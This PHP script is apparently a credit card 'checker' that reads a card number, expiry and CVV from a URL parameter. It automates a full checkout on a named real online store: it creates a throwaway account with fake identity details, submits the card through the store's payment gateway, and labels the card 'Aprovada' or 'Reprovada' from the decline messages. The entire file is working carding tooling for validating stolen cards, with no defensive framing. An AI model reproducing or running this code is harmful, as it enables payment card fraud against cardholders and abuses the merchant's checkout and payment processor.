<?php

if (!isset($_GET['lista']) || empty($_GET['lista'])) {
    exit;
}

$lista = $_GET['lista'];
$lista = str_replace(" ", "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/', '-', $lista);
$lista = str_replace("/", "|", $lista);
$separar = explode("|", $lista);

if (count($separar) < 4) {
    exit;
}

$cc = trim($separar[0]);
$mes = trim($separar[1]);
$ano_raw = trim($separar[2]);
$cvv = trim($separar[3]);

$primeiro = substr($cc, 0, 1);
if ($primeiro == '4') {
    $cc_type = 'Visa';
} elseif ($primeiro == '5' || $primeiro == '2') {
    $cc_type = 'MasterCard';
} elseif ($primeiro == '3') {
    $cc_type = 'AmericanExpress';
} elseif ($primeiro == '6') {
    $cc_type = 'Discover';
} else {
    exit;
}

if (strlen($ano_raw) == 2) {
    $ano = "20" . $ano_raw;
} else {
    $ano = $ano_raw;
}

if (strlen($mes) == 1) {
    $mes = "0" . $mes;
}

function gerarEmail()
{
    $l = 'abcdefghijklmnopqrstuvwxyz';
    $n = '0123456789';
    $s = '';
    for ($i = 0; $i < 3; $i++) $s .= $l[rand(0, 25)];
    for ($i = 0; $i < 4; $i++) $s .= $n[rand(0, 9)];
    return 'aice' . $s . (rand(0, 1) ? '@gmail.com' : '@outlook.com');
}

$email = gerarEmail();
$cookieFile = tempnam(sys_get_temp_dir(), 'ck_');
$zenid = '';

function pegar_zenid($cookieFile, &$zenid)
{
    $cookies = @file_get_contents($cookieFile);
    if ($cookies && preg_match('/zenid\s+(\S+)/', $cookies, $m)) {
        $zenid = $m[1];
    }
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://possuppliesonline.com/catalog/index.php?main_page=product_info&cPath=25_27&products_id=1044');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Priority: u=0, i',
]);
$response = curl_exec($ch);
curl_close($ch);

pegar_zenid($cookieFile, $zenid);

preg_match('/name="securityToken"\s+value="([^"]+)"/', $response, $m);
$token = $m[1] ?? '';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://possuppliesonline.com/catalog/index.php?main_page=product_info&cPath=25_27&products_id=1044&action=add_product');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding: gzip, deflate',
    'Origin: http://possuppliesonline.com',
    'Connection: keep-alive',
    'Referer: http://possuppliesonline.com/catalog/index.php?main_page=product_info&cPath=25_27&products_id=1044',
    'Upgrade-Insecure-Requests: 1',
    'Priority: u=0, i',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'securityToken' => $token,
    'cart_quantity' => '1',
    'products_id' => '1044',
    'x' => '57',
    'y' => '24',
]);
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://possuppliesonline.com/catalog/index.php?main_page=shopping_cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: http://possuppliesonline.com/catalog/index.php?main_page=product_info&cPath=25_27&products_id=1044',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Priority: u=0, i',
]);
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://possuppliesonline.com/catalog/index.php?main_page=checkout_shipping');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection: keep-alive',
    'Referer: http://possuppliesonline.com/',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: cross-site',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
    'TE: trailers',
]);
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://possuppliesonline.com/catalog/index.php?main_page=login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: http://possuppliesonline.com/',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: cross-site',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
    'TE: trailers',
]);
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://possuppliesonline.com/catalog/index.php?main_page=create_account');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://possuppliesonline.com',
    'Connection: keep-alive',
    'Referer: https://possuppliesonline.com/catalog/index.php?main_page=login',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'securityToken=' . $token . '&action=process&email_pref_html=email_format&company=xvideo+corp&firstname=MAX&lastname=dilan&zone_country_id=223&street_address=street+lejw&should_be_empty=&suburb=sakoca&city=new+york&zone_id=43&postcode=10081&telephone=218743726432433&fax=3242342&email_address=' . urlencode($email) . '&password=%40EchoesOfYest&confirmation=%40EchoesOfYest&newsletter=1&email_format=HTML&x=21&y=7');
$response = curl_exec($ch);
curl_close($ch);

pegar_zenid($cookieFile, $zenid);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://possuppliesonline.com/catalog/index.php?main_page=checkout_shipping');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://possuppliesonline.com/catalog/index.php?main_page=login',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
    'TE: trailers',
]);
$response = curl_exec($ch);
curl_close($ch);

preg_match('/name="securityToken"\s+value="([^"]+)"/', $response, $m);
if (!empty($m[1])) $token = $m[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://possuppliesonline.com/catalog/index.php?main_page=checkout_shipping');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://possuppliesonline.com',
    'Connection: keep-alive',
    'Referer: https://possuppliesonline.com/catalog/index.php?main_page=checkout_shipping',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
    'TE: trailers',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'securityToken=' . $token . '&action=process&shipping=upsoauth_UPS+Ground&comments=&x=63&y=12');
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://possuppliesonline.com/catalog/index.php?main_page=checkout_payment');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://possuppliesonline.com/catalog/index.php?main_page=checkout_shipping',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
    'TE: trailers',
]);
$response = curl_exec($ch);
curl_close($ch);

preg_match('/name="securityToken"\s+value="([^"]+)"/', $response, $m);
if (!empty($m[1])) $token = $m[1];

pegar_zenid($cookieFile, $zenid);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://possuppliesonline.com/catalog/index.php?main_page=checkout_confirmation');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://possuppliesonline.com',
    'Connection: keep-alive',
    'Referer: https://possuppliesonline.com/catalog/index.php?main_page=checkout_payment',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'securityToken=' . $token . '&action=submit&dc_redeem_code=&payment=authorizenet_aim&authorizenet_aim_cc_owner=MAX+dilan&authorizenet_aim_cc_number=' . $cc . '&authorizenet_aim_cc_expires_month=' . $mes . '&authorizenet_aim_cc_expires_year=' . $ano . '&authorizenet_aim_cc_cvv=' . $cvv . '&authorizenet_aim_collects_onsite=true&comments=&x=28&y=23');
$response = curl_exec($ch);
curl_close($ch);

preg_match('/name="securityToken"\s+value="([^"]+)"/', $response, $m);
if (!empty($m[1])) $token = $m[1];

pegar_zenid($cookieFile, $zenid);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://possuppliesonline.com/catalog/index.php?main_page=checkout_process');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://possuppliesonline.com',
    'Connection: keep-alive',
    'Referer: https://possuppliesonline.com/catalog/index.php?main_page=checkout_confirmation',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Priority: u=0, i',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'securityToken=' . $token . '&cc_owner=MAX+dilan&cc_expires=' . $mes . substr($ano, -2) . '&cc_type=' . $cc_type . '&cc_number=' . $cc . '&cc_cvv=' . $cvv . '&zenid=' . $zenid);
$response = curl_exec($ch);
curl_close($ch);

preg_match('/<div class="messageStackError larger">.*?<\/div>/s', $response, $m);
$GG = trim(preg_replace('/\s+/', ' ', strip_tags($m[0] ?? '')));

if (strpos($GG, 'This transaction has been declined. - Your credit card could not be authorized for this reason. Please correct the information and try again or contact us for further assistance.') !== false) {
    echo "Reprovada » $cc|$mes|$ano|$cvv » $GG";
} elseif (strpos($GG, 'This transaction has been declined. - The credit card number is invalid. Please correct the information and try again or contact us for further assistance.') !== false) {
    echo "Reprovada » $cc|$mes|$ano|$cvv » $GG";
} elseif (strpos($GG, 'This transaction has been declined. - The credit card expiration date is invalid. Please correct the information and try again or contact us for further assistance.') !== false) {
    echo "Reprovada » $cc|$mes|$ano|$cvv » $GG";
} elseif (strpos($GG, 'This transaction has been declined. - The credit card security code is invalid. Please correct the information and try again or contact us for further assistance.') !== false) {
    echo "Reprovada » $cc|$mes|$ano|$cvv » $GG";
} elseif (strpos($response, 'Thank you for your order!') !== false) {
    echo "Aprovada » $cc|$mes|$ano|$cvv » Transação aprovada!";
} elseif (strpos($GG, 'There was an issue while validating your CVV or Billing Address.')!== false){
    echo "Aprovada » $cc|$mes|$ano|$cvv » $GG";    
} else {
    echo "$GG";
}

unlink($cookieFile);